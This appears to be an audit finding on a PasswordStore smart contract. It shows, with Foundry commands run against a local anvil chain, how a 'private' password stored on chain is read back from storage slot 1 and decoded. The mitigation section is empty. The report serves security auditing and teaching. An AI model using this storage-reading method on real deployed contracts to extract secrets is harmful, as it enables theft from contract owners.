### [S-#] S-01 Storing password on chain makes it visible to anyone, regardless of the variable visibility. 

**Description:** All data stored on-chain is visible to anyone, and it can be read directly from the blockchain. The `PasswordStore::s_password` variable is intended to be a private variable, and only accessed through `PasswordStore::getPassword()` function, which is intended to be called by the owner of the contract.

We show one such method of reading any data off the chain below.

**Impact:** Attackers can steal the password by reading it directly from the blockchain, severely breaking functionality of the contract.

**Proof of Concept:** (Proof of Concept)

The below test case shows how anyone can read password directly off the blockchain

1. Create a locally running chain
```
make anvil
```

2. Deploy the contract to the chain.
```
forge script script/DeployPasswordStore.s.sol:DeployPasswordStore --rpc-url http://127.0.0.1:8545 --private-key <ANVIL_PRIVATE_KEY> --broadcast -vvv
```

3. Run the storage tool
We use `1` because that's the storage slot of `s_password`
```
cast storage <CONTRACT_ADDRESS> 1 --rpc-url http://127.0.0.1:8545
```

You'll get an output like this,
`0x6d7950617373776f726400000000000000000000000000000000000000000014`

4. Decode the output
You can parse that hex to string using,
```
cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
```

and get output of,

```
myPassword
```

**Recommended Mitigation:** 

<!-- 0x5FbDB2315678afecb367f032d93F642f64180aa3 -->